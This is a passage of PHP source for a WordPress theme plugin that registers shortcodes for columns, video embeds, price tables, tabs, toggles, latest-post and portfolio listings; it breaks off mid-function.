<?php
/* Plugin Name: Velocity Visual Composer AddOn
Plugin URI: http://www.damojothemes.com
Description: Awesome Shortcodes to extend the Visual Composer for the use with the Velocity Theme!
Version: 1.1
Author: Damojo
Author URI: http://www.damojothemes.com
License: GPLv2 or later
*/

define( 'DAMOJOSTRAP_PATH', plugin_dir_path(__FILE__) );
define( 'DAMOJOSTRAP_URL',str_replace("index.php","",plugins_url( 'index.php', __FILE__ )));

if ( ! defined( 'ABSPATH' ) )
	die( "Can't load this file directly" );

class DamojoCodes
{
	function __construct() {
		add_action( 'admin_init', array( $this, 'action_admin_init' ) );
	}
	
	function action_admin_init() {
		if ( current_user_can( 'edit_posts' ) && current_user_can( 'edit_pages' ) ) {
			add_filter( 'mce_buttons', array( $this, 'filter_mce_button' ) );
			add_filter( 'mce_external_plugins', array( $this, 'filter_mce_plugin' ) );
		}
	}
	
	function filter_mce_button( $buttons ) {
		array_push( $buttons, '|', 'thundercodes_button' );
		return $buttons;
	}
	
	function filter_mce_plugin( $plugins ) {
		$plugins['thundercodes'] = DAMOJOSTRAP_URL . 'editor/thundercodes_plugin.js';
		return $plugins;
	}
}
//$damojoCode = new DamojoCodes();

//SHORTCODES
$template_uri_shortcodes = get_template_directory_uri();


/* ------------------------------------- */
/* SHORTCODES */
/* ------------------------------------- */

// Language Options
		$velocity_readmore = __('Read More', 'velocity');
		$velocity_in = __('in', 'velocity');
		$velocity_by = __('by', 'velocity');
		$velocity_view = __('View Details','velocity');
		$velocity_enlarge = __('Enlarge','velocity');
		$velocity_see_all = __('SEE ALL','velocity');

/* COLUMN 1/2 */

$template_uri_shortcodes = get_template_directory_uri();


/*___________________________________________________________________________________*/
/*	Column Shortcodes
/*___________________________________________________________________________________*/

	if (!function_exists('columns_builder')) {
		function columns_builder( $atts, $content = null, $tag ) {
	        extract( shortcode_atts(  array(
	                // extra classes
	                'class' => ''
	        ), $atts ) );
	        if ( $class != '' )
	                $class = ' ' . $class;
	        $last = '';
	        $clear = '';
	        // check the shortcode tag to add a "last" class
	        if ( strpos( $tag, '_last' ) > 0 ){
	                $last = ' lastcolumn';
	                $clear = '<div class="clear"></div>';
	                $tag = str_replace("_last", "", $tag);
	        }
	        $output = '<div class="' . $tag . $last . $class . '">' . do_shortcode( $content ) . '</div>'.$clear;
	        return $output;
	    }
	}

	$columns = array(
        'one_half',
        'one_half_last',
        'one_third',
        'one_third_last',
        'two_third',
        'two_third_last',
        'one_fourth',
        'one_fourth_last',
        'three_fourth',
        'three_fourth_last',
        'one_fifth',
        'one_fifth_last',
        'two_fifth',
        'two_fifth_last',
        'three_fifth',
        'three_fifth_last',
        'four_fifth',
        'four_fifth_last',
        'one_sixth',
        'one_sixth_last',
        'five_sixth',
        'five_sixth_last',
    );

	foreach( $columns as $tag ) {
	        add_shortcode( $tag, 'columns_builder' );
	}

//PRE
	if (!function_exists('pre')) {
		function pre( $atts, $content = null ) {
			$content = damojoShortcodes_parse_shortcode_content( $content );
		   return '<pre>' . str_replace("<br />","",$content) . '</pre><div class="clear"></div>';
		}
		add_shortcode('pre', 'pre');
	}

//DROPCAP
	if (!function_exists('dropcap')) {
		function dropcap( $atts, $content = null ) {
			extract(shortcode_atts(array(
				'style' => '',
				'color' => ''
			), $atts));
			$content = damojoShortcodes_parse_shortcode_content( $content );
			if($style == 'square') $style = "minirounding nomarginbottom";
		   return '<p class="dropcap '.$style.' '.$color.'">' . do_shortcode($content) . '</p><div class="clear"></div>';
		}
		add_shortcode('dropcap', 'dropcap');
	}

//LISTS
	if (!function_exists('styledlist')) {
		function styledlist( $atts, $content = null ) {
			extract(shortcode_atts(array(
				'style' => '1',
				'color' => ''
			), $atts));
			$content = damojoShortcodes_parse_shortcode_content( $content );
		   return '<div class="style'.$style.' '.$color.'">' . do_shortcode($content) . '</div><div class="clear"></div>';
		}
		add_shortcode('styledlist', 'styledlist');
	}


/* Video */
function video_builder( $atts ) {
	extract(shortcode_atts(array(
		'source' => '',
		'video_id' => '',
		'height' => '',
		'width' => ''
	), $atts));
	$main_color = str_replace("#","",get_option("velocity_highlight_color"));
   $return_list = '<div class="scalevid">';
   if($source=="youtube")
   		$return_list .= '<iframe src="http://www.youtube.com/embed/'.$video_id.'?hd=1&amp;wmode=opaque&amp;controls=1&amp;showinfo=0&amp;autohide=1" width="'.$width.'" height="'.$height.'"></iframe></div>';
   else
   		$return_list .= '<iframe src="http://player.vimeo.com/video/'.$video_id.'?title=0&amp;byline=0&amp;portrait=0&amp;autohide=1&amp;color='.$main_color.'" width="'.$width.'" height="'.$height.'"></iframe></div>';

   		return $return_list;
}
add_shortcode('video', 'video_builder');

/* YOUTUBE VIDEO */

function vid_youtube( $atts ) {
	extract(shortcode_atts(array(
		'video_id' => '',
		'height' => '',
		'width' => ''
	), $atts));
   return '<div class="scalevid"><iframe src="http://www.youtube.com/embed/'.$video_id.'?hd=1&amp;wmode=opaque&amp;controls=1&amp;showinfo=0&amp;autohide=1" width="'.$width.'" height="'.$height.'"></iframe></div>';
}
add_shortcode('video_youtube', 'vid_youtube');

/* VIMEO VIDEO */

function vid_vimeo( $atts ) {
	extract(shortcode_atts(array(
		'video_id' => '',
		'height' => '',
		'width' => ''
	), $atts));
	$main_color = str_replace("#","",get_option("velocity_highlight_color"));
   return '<div class="scalevid"><iframe src="http://player.vimeo.com/video/'.$video_id.'?title=0&amp;byline=0&amp;portrait=0&amp;autohide=1&amp;color='.$main_color.'" width="'.$width.'" height="'.$height.'"></iframe></div>';
}
add_shortcode('video_vimeo', 'vid_vimeo');


// Spacer
	function spacer_build( $atts ) {
	extract(shortcode_atts(array(
		'height' => '',
		'hidemobile' => '',
		'visiblemobile' => ''
	), $atts));
	$hidemobile = (!empty($hidemobile) && $hidemobile == "on") ? "hidden-phone" : "";
	$visiblemobile = (!empty($visiblemobile) && $visiblemobile == "on") ? "visible-phone" : "";
	
   return '<div class="'.$hidemobile.' '.$visiblemobile.'" style="display:block;clear:both;height:'.$height.'px"></div>';
}
add_shortcode('spacer', 'spacer_build');

// Divider
function divider_build($atts) {
   extract(shortcode_atts(array(
		'before' => '',
		'after' => ''
	), $atts));
	if($before=='') $before=0;
	if($after=='') $after=0;
   return '<div class="divider" style="margin-top:'.$before.';margin-bottom:'.$after.'"></div>';
}
add_shortcode('divider', 'divider_build');



// Center Button
	if (!function_exists('centerbutton')) {
		function centerbutton( $atts,$content = null ) {
			return '<div class="button-container">'.do_shortcode($content).'</div>';
		}
		add_shortcode('centerbutton', 'centerbutton');
	}

	function twitter_build( $atts ) {
		extract(shortcode_atts(array(
			'user' => '',
			'count' => ''
		), $atts));

		$uniq = uniqid("ts_");

		$twitter = '<div class="twitter_container_head"></div><div class="twitter_container"><div class="twitter_shortcode" data-user="'.$user.'" data-count="'.$count.'"></div></div><div class="twitter_container_footer"></div>';
	   	return $twitter;
	}
	add_shortcode('twitter', 'twitter_build');


// Quotes
	function blockquote_build( $atts, $content = null ) {
		   extract(shortcode_atts(array(
				'author' => '',
				'float' => '',
				'style' => ''
			), $atts));
			$content = damojoShortcodes_parse_shortcode_content( $content );

		   if($float!="")$float = "quote".$float;
		   if ($author=="")
		   	return '<blockquote class="'.$float.' '.$style.'"><p>' . do_shortcode($content) . '</blockquote><div class="clear"></div>';
		   else
		   	return '<blockquote class="'.$float.' '.$style.'"><p>' . do_shortcode($content) . '<p><cite>'.$author.'</cite></blockquote><div class="clear"></div>';
		}
		add_shortcode('blockquote', 'blockquote_build');

if(!function_exists("showbiz_build_shortcode")){
	function showbiz_build_shortcode($atts){
		extract(shortcode_atts(array(
				'showbiz' => ''
			), $atts));			
			return do_shortcode('[showbiz '.$showbiz.']');
			
		}
		add_shortcode( 'showbiz_build', 'showbiz_build_shortcode' );
	}

// Lightbox
	function lboximage( $atts, $content = null ) {
		extract(shortcode_atts(array(
			'thumb' => '',
			'thumbwidth' => '',
			'thumbheight' => '',
			'link' => '',
			'lightbox_link' => '',
			'title' => '',
			'hover' => '',
			'align' => ''
		), $atts));
		global $velocity_enlarge;

		// Load Hover Script (see register_slider_script,print_slider_script)
		global $add_hover_script;
		$add_hover_script = true;

		$float = $align;
		if($thumbheight!="auto" && $thumbheight!=""){
			$thumbheight = "height='$thumbheight'";
		}
		else $thumbheight = "height='auto'";
		if($thumbwidth!="100%" && $thumbwidth!=""){
			$thumbwidth_px = $thumbwidth."px";
		}
		else {
			$thumbwidth_px = "auto";
			$thumbwidth="auto";
		}

		$unique = "";

		 if($lightbox_link != "") $thumb2 = $lightbox_link;
        else $thumb2 = $thumb;

		if($link!="") $notalone = "notalone";
		else $notalone = "";

		if($align=="left" || $align=="") $align = "left mr";
		else $align = "right ml";

		if(is_numeric($thumb)){
			$thumb = wp_get_attachment_image_src($thumb, 'full'); $thumb = $thumb[0];
		}
		
		if(is_numeric($thumb2)){
			$thumb2 = wp_get_attachment_image_src($thumb2, 'full'); $thumb2 = $thumb2[0];
		}


		$return_list = '<div class="'.$align.'" style="width:'.$thumbwidth_px.';">
							<div class="holderwrap">
								<div class="mediaholder">
									<a href="'.$thumb2.'" rel="group2" data-rel="group2" class="fancybox" title="'.$title.'"><img src="'.$thumb.'" alt="'.$title.'"></a>';
		$return_list .= '</div>
								<div class="foliotextholder">
									<div class="foliotextwrapper">
										<h5 class="itemtitle"><a href="'.$link.'">'.$title.'</a></h5>
									</div>
								</div>
							</div>
						</div>
';


		return $return_list;

	}
	add_shortcode('lightbox', 'lboximage');




//Price Table
	function pricetable_build( $atts, $content = null ) {
		extract(shortcode_atts(array(
			'columns' => ''
		), $atts));

		if($columns==5) $colvar = "fivecols";
		if($columns==4) $colvar = "fourcols";
		if($columns==3) $colvar = "threecols";

		$pricetable_column_count=1;

		return '<div class="pricing '.$colvar.'">'.do_shortcode($content).'</div>';
	}
	add_shortcode('pricetable', 'pricetable_build');

	function pricetable_column_build( $atts, $content = null ) {
		extract(shortcode_atts(array(
			'highlight' => '',
			'title' => '',
			'titlesubline' => '',
			'price' => '',
			'price_currency' => '',
			'button_url' => '',
			'button_text' => '',
			'button_type' => ''
		), $atts));

		if($highlight!="normal") {
			$highlight = "highlight";
		} else {
			$highlight = "";
		}

		// Column Head
		$return_list = '<div class="pricecol '.$highlight.'"><div class="pricewrap">
						<div class="thead">'.$title.'<br/><span class="byline">'.$titlesubline.'</span></div>
						<div class="price"><span class="dollar">'.$price_currency.'</span> '.$price.'</div>'.do_shortcode(damojoShortcodes_parse_shortcode_content($content));
		// Button
		if($button_text!=""){
			if($button_type=="primary"){
				$return_list .='<div class="buy"><a href="'.$button_url.'" class="btn btn-info bold">'.$button_text.'</a></div>';
			}
			else {
				$return_list .='<div class="buy"><a href="'.$button_url.'" class="btn bold">'.$button_text.'</a></div>';
			}
		}
		// Footer
		$return_list .='</div></div>';
		return $return_list;
	}
	add_shortcode('pricetable_column', 'pricetable_column_build');

//VC_Pricetables
	if(!function_exists("pricetable_columns_build")){
		function pricetable_columns_build( $atts, $content = null ) {
			$return_list = "";
			for($i = 1 ; $i<7 ; $i++){
				if(isset($atts["title".$i])){
					if(isset($atts["highlight".$i]) && $atts["highlight".$i]!="highlight") {
						$atts["highlight".$i] = "";
					} else {
						$atts["highlight".$i] = "highlight";
					}
			
					//Content
					$content = explode(",", $atts["content".$i]);
					$column_content = "";
					foreach($content as $contentline){
						$contentline = "<div class='item'>" . $contentline . "</div>";
						$column_content .= $contentline;
					}
			
					// Column Head
					$atts["titlesubline".$i] = empty($atts["titlesubline".$i]) ? "" : '<br/><span class="byline">'.$atts["titlesubline".$i].'</span>';
					$return_list .= '<div class="pricecol '.$atts["highlight".$i].'"><div class="pricewrap">
									<div class="thead">'.$atts["title".$i].$atts["titlesubline".$i].'</div>
									<div class="price"><span class="dollar">'.$atts["price_currency".$i].'</span> '.$atts["price".$i].'</div>'.$column_content;
					// Button
					/*if($atts["button_text".$i]!=""){
						if($atts["button_type".$i]=="primary"){
							$return_list .='<div class="buy"><a href="'.$atts["button_url".$i].'" class="btn btn-primary bold">'.$atts["button_text".$i].'</a></div>';
						}
						else {*/
					$return_list .='<div class="buy"><a href="'.$atts["button_url".$i].'" class="btn bold">'.$atts["button_text".$i].'</a></div>';
					/*	}
					}*/
					// Footer
					$return_list .='</div></div>';
				}
				else { $i--;	break; }
			}
		
		switch($i){
			case '5':
				$colvar = "fivecols";
				break;
			case '3':
				$colvar = "threecols";
				break;
			default:
				$colvar = "fourcols";
		}

		return '<div class="pricing '.$colvar.'">'.$return_list.'</div>';		}
		add_shortcode('pricetable_columns', 'pricetable_columns_build');
}
//Services
	$service_column_count=1;
	$service_columns = 3;

	function service_build( $atts, $content = null ) {
		extract(shortcode_atts(array(
			'columns' => ''
		), $atts));

		global $service_column_count;
		global $service_columns;

		if($columns==4) $service_columns = 4;
		if($columns==3) $service_columns = 3;
		if($columns==2) $service_columns = 2;

		$service_column_count=1;

		return '<div class="row services"><div class="servicewrap">'.do_shortcode($content).'</div></div>';
	}
	add_shortcode('service', 'service_build');

	function service_column_build( $atts, $content = null ) {
		extract(shortcode_atts(array(
			'icon_type' => '',
			'title' => '',
			'titlesubline' => '',
			'button_target' => '',
			'button_url' => ''
		), $atts));
		global $service_column_count;
		global $service_columns;

		if($service_columns==4) $service_columns = "span3";
		if($service_columns==3) $service_columns = "span4";
		if($service_columns==2) $service_columns = "span6";

		$service_column_count++;

		// Column Head
		$return_list = '<div class="'.$service_columns.'">
						<a href="'.$button_url.'" target="'.$button_target.'" class="service">';
		if($icon_type!="none"){
		$return_list .='<div class="serviceicon '.$icon_type.'"></div>';
		}
		$return_list .='<h4>'.$title.'</h4>
						<h5>'.$titlesubline.'</h5>
						<div class="text">'.do_shortcode(damojoShortcodes_parse_shortcode_content($content)).'</div>';
		// Footer
		$return_list .='</a></div>';
		return $return_list;
	}
	add_shortcode('service_column', 'service_column_build');






	function tabs_builder( $atts, $content = null ) {
		$defaults = array();
		extract( shortcode_atts( $defaults, $atts ) );

		// Extract the tab titles for use in the tab widget.
		preg_match_all( '/tab title="([^\"]+)"/i', $content, $matches, PREG_OFFSET_CAPTURE );

		

		$tab_titles = array();
		if( isset($matches[1]) ){ $tab_titles = $matches[1]; }

		preg_match_all( '/ prefix="([^\"]+)"/i', $content, $matches, PREG_OFFSET_CAPTURE );
		


		$output = '<div class="bs-docs-example">';

		$uniq = uniqid("tabs_");

		if( count($tab_titles) ){
		   $output .= '<ul id="'.$uniq.'" class="nav nav-tabs centerlist_onmobile">';
		    $counter = 0;
			foreach( $tab_titles as $tab ){
				if(isset($matches[0][$counter][0])){
					$prefix = $matches[0][$counter][0];
					$prefix = str_replace('prefix=', "",$prefix);
					$prefix = str_replace('"',"",$prefix);
					$prefix = '<span class="tab-prefix">'.$prefix.'</span>';
				} 
				else $prefix = "";
				$output .= '<li><a class="tab-link" href="#tab-'. str_replace("%","",sanitize_title( $tab[0] )) .'"  data-toggle="tab">'.$prefix.'<span>' . $tab[0] . '</span></a><div class="clear"></div></li>';					
				$counter++;
			}

		    $output .= '</ul><ul id="myTabContent'.$uniq.'" class="tab-content">';
		    $output .= do_shortcode( $content );
		    $output .= '</ul></div><div class="clear"></div><script>jQuery("#myTabContent'.$uniq.' li:first , #'.$uniq.' li:first").each(function(){jQuery(this).addClass("active in")});;</script>';
		} else {
			$output .= do_shortcode( $content );
		}

		return $output;
	}
	add_shortcode( 'vc_tabs', 'tabs_builder' );
	add_shortcode( 'tabs', 'tabs_builder' );


	function tab_builder( $atts, $content = null ) {
		$defaults = array( 'title' => 'Tab' );
		extract( shortcode_atts( $defaults, $atts ) );


		return '<li id="tab-'. str_replace("%","",sanitize_title( $title )) .'" class="tab-pane fade">'. do_shortcode( $content ) .'</li>';
	}
	add_shortcode( 'vc_tab', 'tab_builder' );
	add_shortcode( 'tab', 'tab_builder' );
	
	$parent_acc = uniqid("_");

	function toggles_builder( $atts, $content = null ) {
		$defaults = array();
		extract( shortcode_atts( $defaults, $atts ) );
		global $parent_acc;
		$output = '<div id="accordion'.$parent_acc.'" class="accordion">'.do_shortcode($content).'</div>';

		return $output;
	}
	add_shortcode( 'toggles', 'toggles_builder' );
	

	function toggle_builder( $atts, $content = null ) {
		$defaults = array( 'title' => 'Toggle', 'active' => '' );
		extract( shortcode_atts( $defaults, $atts ) );
		global $parent_acc;
		$unique = uniqid();

		if($active=="active")$active_in="in";
		else $active_in = "";

		$returnlist = '<div class="accordion-group '.$active.'">
			            <div class="accordion-heading">
			                <a class="accordion-toggle" href="#collapse'.$unique.'" data-parent="#accordion'.$parent_acc.'" data-toggle="collapse">'.$title.'</a>
		            </div>

		            <div id="collapse'.$unique.'" class="accordion-body collapse '.$active_in.'">
		                <div class="accordion-inner">'.do_shortcode($content).'</div>
		            </div>
		        </div>';
		 $parent_acc = uniqid("_");
		 return $returnlist;
	}
	add_shortcode( 'toggle', 'toggle_builder' );
	




// Highlight Content
	function highlightcontent_builder( $atts, $content = null ) {
		$return_list = '<div class="highlightbox contenttable">'.damojoShortcodes_parse_shortcode_content(do_shortcode($content)).'</div><div class="clear"></div>';
		return $return_list;
	}
	add_shortcode( 'highlightbox', 'highlightcontent_builder' );

// LATEST POSTS
	function latest_posts_build( $atts, $content = null  ) {
		extract(shortcode_atts(array(
			'number' => 3,
			'category_info' => '',
			'date_info' => 'on',
			'comments_info' => '',
			'category' => '',
			'excerpt_words'=> '20',
			'columns' => '2'
		), $atts));

		$spacer = '';
		switch ($columns){
			case '1':
				$column = "";
				$spacer = '<div class="top20"></div>';
				break;
			case '3':
				$column = "one_third";
				break;
			default:
				$column = "one_half";
				break;
		}

		global $velocity_readmore;
		global $velocity_in;
		global $velocity_see_all;

		// Load Hover Script (see register_slider_script,print_slider_script)
		global $add_hover_script;
		$add_hover_script = true;

		$content = damojoShortcodes_parse_shortcode_content( $content );

		$ptype = 'post';
		$style = "";
		$type="text";
		$order = "latest";

		$category = get_category_by_slug($category);
		if($category) $catid = $category->term_id;
		else $catid="";

		if($order=='latest'){
			$popargs = array( 'numberposts' => $number, 'orderby' => 'post_date', 'cat' => $catid,'suppress_filters' => 0 );
		}else{
			$popargs = array( 'numberposts' => $number, 'orderby' => 'comment_count', 'cat' => $catid,'suppress_filters' => 0 );
		}

		$unique = uniqid();
		$poplist = get_posts( $popargs );
		$element_count=1;
		$return_list = '<div class="row blogtextwrap">
		<!--
		########################################
			-	BLOG MODULE  -
		########################################
		-->

		<div class="postarea">

			<!-- Blog Posts -->
			<div class="row span homeposts">';
		$counter = 0;
		foreach ($poplist as $poppost) :
				setup_postdata($poppost);
				$postcustoms = velocity_getOptions($poppost->ID);
				$post_top_width = 140;
				$post_top_height = 140;
				$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title().'"><div class="posticonbg"></div><i class="icon-forward posticon"></i><img src="'.get_template_directory_uri().'/img/posticonbg.png"></a>';
				$blogimageurl="";
				$blogimageurl = aq_resize(wp_get_attachment_url(get_post_thumbnail_id($poppost->ID) ),$post_top_width,$post_top_height,true);
				//Post Type related Object to display in the Head Area of the post
					if(isset($postcustoms["velocity_post_type"])){ 
							switch ($postcustoms["velocity_post_type"]) {
								case 'image':
									if($blogimageurl!=""){										
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title($poppost->ID).'" class="withimage"><div class="posticonbg"><i class="icon-forward posticon"></i></div><img src="'.$blogimageurl.'" alt="" width="70" height="70"></a>';						}
									else{
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title().'"><div class="posticonbg"></div><i class="icon-forward posticon"></i><img src="'.get_template_directory_uri().'/img/posticonbg.png"></a>';	
									}
								break;
								case 'video':
									if($blogimageurl!=""){										
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title($poppost->ID).'" class="withimage"><div class="posticonbg"><i class="icon-video-1 posticon"></i></div><img src="'.$blogimageurl.'" alt="" width="70" height="70"></a>';						}
									else{
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title().'"><div class="posticonbg"></div><i class="icon-video-1 posticon"></i><img src="'.get_template_directory_uri().'/img/posticonbg.png"></a>';
									}
								break;
								case 'slider':
									if($blogimageurl!=""){										
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title($poppost->ID).'" class="withimage"><div class="posticonbg"><i class="icon-retweet posticon"></i></div><img src="'.$blogimageurl.'" alt="" width="70" height="70"></a>';						}	
									else{
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title().'"><div class="posticonbg"></div><i class="icon-retweet posticon"></i><img src="'.get_template_directory_uri().'/img/posticonbg.png"></a>';
									}
								break;
								default:
									$blogimageurl="";
									$blogimageurl = aq_resize(wp_get_attachment_url( get_post_thumbnail_id($poppost->ID) ),$post_top_width,$post_top_height,true);
									if($blogimageurl!=""){										
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title($poppost->ID).'" class="withimage"><div class="posticonbg"><i class="icon-forward posticon"></i></div><img src="'.$blogimageurl.'" alt="" width="70" height="70"></a>';							}	
									else{
										$post_top = '<a href="'.get_permalink($poppost->ID).'" title="'.get_the_title().'"><div class="posticonbg"></div><i class="icon-forward posticon"></i><img src="'.get_template_directory_uri().'/img/posticonbg.png"></a>';
										}
								break;
							}
//						print_r($post_top);
					}

				
				// Categories
				if($category_info!="off" && $category_info!=""){
					$entrycategory = "";
					foreach((get_the_category($poppost->ID)) as $dcategory) {
						$entrycategory .= ', <a href="'.get_category_link($dcategory->term_id ).'">'.$dcategory->cat_name.'</a>';
					}
					$entrycategory = substr($entrycategory, 2);
					$return_category = '<div class="categories">'.$velocity_in.' '.$entrycategory.'</div>';
				}
				else $return_category = "";

				// Excerpt
				if($excerpt_words != "" && $excerpt_words > 0){
					$postexcerpt = damojoShortcodes_excerpt_by_id($excerpt_words,$poppost->ID);
					$return_excerpt = '<div class="posttext">'.$postexcerpt.'</div>';
				}
				else $return_excerpt = "";

                // Date
                if($date_info!="off" && $date_info!=""){
					$post_time_day = date_i18n('d', strtotime($poppost->post_date_gmt));
					$post_time_month = date_i18n('M', strtotime($poppost->post_date_gmt));
					$post_time_year = date_i18n('Y', strtotime($poppost->post_date_gmt));
					$return_date = '<div class="date">
										<div class="day">'.$post_time_day.'</div>
										<div class="month">'.$post_time_month.'</div>
									</div>';
				}
				else $return_date = "";

                // Comments
                if($comments_info!="off" && $comments_info!=""){
                	$num_comments = get_comments_number($poppost->ID);
					if ( comments_open() ) {
					 if ( $num_comments == 0 ) {
					  $comments = __('No Comments','velocity');
					 } elseif ( $num_comments > 1 ) {
					  $comments = $num_comments . __(' Comments','velocity');
					 } else {
					  $comments = __('1 Comment','velocity');
					 }
					 $return_comments = '<div class="comments"><a href="' . get_comments_link($poppost->ID) .'">'. $comments.'</a></div>';
					} else {
					 $return_comments = '<div class="comments">'.__('Comments are off for this post.','velocity').'</div>';
					}
                }
                else $return_comments = "";

				$counter++;
				$class="";
                // Content
                
                if ($counter%$columns != 0) {
                	 $class="";
				} else {
					 $counter=0;
					 $class="lastcolumn";
				}
				

				
           		 $return_list .= '<div class="'.$column.' '.$class.'"><div class="homepostholder "><div class="homepostimage">'.$post_top.$return_date.'</div><div class="homepost">
									<div class="post">
										<div class="postbody">
											<h4><a href="'.get_permalink($poppost->ID).'">'.$poppost->post_title.'</a></h4>
											<div class="postinfo">
												'.$return_category.'
												'.$return_comments.'
											</div>
											'.$return_excerpt.'
											<div class="clear"></div>
											<!--a href="'.get_permalink($poppost->ID).'" class="readmorelink">'.__("Read more","velocity").'</a-->
										</div>
									</div>
								</div><div class="clear"></div></div></div>'.$spacer;
					
					$element_count++;
      endforeach;
      $return_list .= '
				<div class="clear"></div>
		</div><!-- END OF HOMEPOSTS -->
</div> <!-- END OF ROW -->
<div class="clear"></div>
</div> <!-- END OF BLOGTEXTWRAP -->';
      $wp_query = null;
	  //$wp_query = $temp;
	  wp_reset_query();
      return $return_list;
	}
	add_shortcode('latest_posts', 'latest_posts_build');

// LATEST PORTFOLIO
	function latest_portfolio_build( $atts, $content = null  ) {
		extract(shortcode_atts(array(
			'items' => 99,
			'columns' => 4,
			'portfolio' => 'portfolio',
			'height' => '',
			'filter' => '',
			'category' => ''
		), $atts));

		global $velocity_readmore;
		global $velocity_in;
		global $velocity_see_all;

		$number = $items;

		// Load Hover Script (see register_slider_script,print_slider_script)
		global $add_hover_script;
		$add_hover_script = true;

		$content = damojoShortcodes_parse_shortcode_content( $content );


		$ptype = 'portfolio';
		$pcat = 'category_'.$portfolio;
		$style = "";


		global $post;
		
		$pagecustoms = velocity_getOptions($post->ID);
		
		if(isset($pagecustoms["velocity_activate_sidebar"]) && isset($pagecustoms["velocity_sidebar"])) $class="withsidebar";
		else $class = "";

		if(empty($category))
			$popargs=array(
				'post_type' => $portfolio,
				'posts_per_page' => $number,
				'suppress_filters' => 0
			);
		else
			$popargs=array(
				'post_type' => $portfolio,
				'posts_per_page' => $number,
				'suppress_filters' => 0,
				'tax_query' => array(
		            array(
		                'taxonomy' => $pcat,
		                'field' => 'slug',
		                'terms' => array($category)
		            )
		        )
			);

		switch($columns){
		case "5":
			$display_span = "fivecol";
		break;
		case "3":
			$display_span = "threecol";
		break;
		default:
			$display_span = "fourcol";
		break;
	}

		$count_posts = wp_count_posts('posts');

		$unique = uniqid();
		$poplist = get_posts( $popargs );
		$element_count=1;
		
		//Language Options
		$velocity_all = __('All', 'velocity');
		$filtermarkup ='';
	    $tax_terms = get_terms($pcat);  
        $filtermarkup = '<ul class="portfoliofilter clearfix">';
            
		if($velocity_all!="" ) { 
		  $filtermarkup .='<li><a class="selected" data-filter="*" href="#">'.$velocity_all.'</a><span></span></li>';
		}
		if(is_array($tax_terms)){
			foreach ( $tax_terms as $tax_term ) {
					$filter_last_item = end($tax_terms);
					if($tax_term!=$filter_last_item){
						$filtermarkup .='<li><a data-filter=".'.$tax_term->slug.'" href="#">'.$tax_term->name.'</a></li>';
					}else{
						$filtermarkup .= '<li><a data-filter=".'.$tax_term->slug.'" href="#">'.$tax_term->name.'</a></li>';
					}
				}
		}
			
        $filtermarkup .= '</ul>';

        if(!empty($filter)) $filtermarkup = "";
       
		
		$html = $filtermarkup.'
    <!-- Portfolio -->
    <div class="row '.$display_span.' portfoliowrap" >
        <!-- Portfolio Items -->
        <div class="portfolio '.$class.'">';
        

		foreach ($poplist as $poppost) :
				setup_postdata($poppost);
				$postcustoms = velocity_getOptions($poppost->ID);

				if(isset($postcustoms["velocity_post_type"])){
					switch ($postcustoms["velocity_post_type"]) {
						case 'video':
							if($postcustoms["velocity_video_type"]=="youtube") $blogimageurl_pp = "http://www.youtube.com/watch?v=".$postcustoms["velocity_youtube_id"];
							elseif($postcustoms["velocity_video_type"]=="vimeo") $blogimageurl_pp = "http://vimeo.com/".$postcustoms["velocity_vimeo_id"];
							else $blogimageurl_pp = wp_get_attachment_url( get_post_thumbnail_id($poppost->ID));
						break;
						default:
							$blogimageurl_pp = wp_get_attachment_url( get_post_thumbnail_id($poppost->ID));
						break;
					}
				}

				//Post Features
				if(isset($postcustoms["velocity_item_categories"])) $velocity_item_categories = "Off";
				else $velocity_item_categories = "On";

				if(isset($postcustoms["velocity_item_features"])) $velocity_item_features = $postcustoms['velocity_item_features'];
				else $velocity_item_features = "link";

				$p_linkactive = "Off";
				$p_zoomactive = "Off";
				if($velocity_item_features=="link" || $velocity_item_features=="linkzoom" ){ $p_linkactive = "On"; }
				if($velocity_item_features=="zoom" ){ $p_zoomactive = "On"; }

				if($velocity_item_features=="linkzoom"){ $notalonemod = "notalone"; } else { $notalonemod = ""; }

				$blogimageurl = empty($height) ? aq_resize(wp_get_attachment_url( get_post_thumbnail_id($poppost->ID)),400,400) : aq_resize(wp_get_attachment_url( get_post_thumbnail_id($poppost->ID)),400,$height,true);
				$blogimageurl_pp = wp_get_attachment_url( get_post_thumbnail_id($poppost->ID));
					
				if($blogimageurl==""){
					$blogimageurl = $template_uri.'/img/demo/400x300.jpg';
				}

				$categorylinks = get_the_term_list( $poppost->ID, $pcat, '', ', ', '' );
				$categories = get_the_terms($poppost->ID,$pcat);
				$categorylist="";
				if(is_array($categories)){
					foreach ($categories as $category) {
						$categorylist.= $category->slug." ";
					}
				}
				
				
			$thetarget = "";	
				
			 if(!empty($postcustoms["velocity_launch_project"]) && !empty($postcustoms["velocity_launch_project_type"]) && ($postcustoms["velocity_launch_project_type"]=="external" || $postcustoms["velocity_launch_project_type"]=="internal") ){
				 if($postcustoms["velocity_launch_project_type"]=="external")
				 	$thetarget = 'target="_blank"';
				 else
				 	$thetarget = '';
				 $thelink = $postcustoms["velocity_launch_project"];
			 }
			 else {
				$thelink = get_permalink($poppost->ID);
				$thetarget = "";
			}

			
			$html .='<div class="entry '. $categorylist.'">
						<div class="holderwrap">
							<div class="mediaholder">
								<img src="'.$blogimageurl.'" alt="">
								<div class="cover"></div>';
					if($p_linkactive=="On"){  $html .= '<a href="'.$thelink.'" '.$thetarget.'><div class="link icon-forward '.$notalonemod.'"></div></a>'; }
					if($p_zoomactive=="On"){  $html .= '<a title="'.get_the_title($poppost->ID).'" href="'.$blogimageurl_pp.'" rel="imagegroup" data-rel="imagegroup" class="fancybox"><div class=" show icon-search '.$notalonemod.'"></div></a>'; }
					$html .= '</div>
							<div class="foliotextholder">
								<div class="foliotextwrapper">
									<h5 class="itemtitle"><a href="'.$thelink.'" '.$thetarget.'>'.get_the_title($poppost->ID).'</a></h5>';
					if($velocity_item_categories=="On" && !is_wp_error($categorylinks)){ $html .= '<span class="itemcategories">'.$categorylinks.'</span>'; }
					$html .='			</div>
							  <div class="clear"></div>
							</div>
							<div class="folio_underlay">
							</div>
						</div>
					</div>';







      endforeach;
      $html .= '</div>
    </div>';
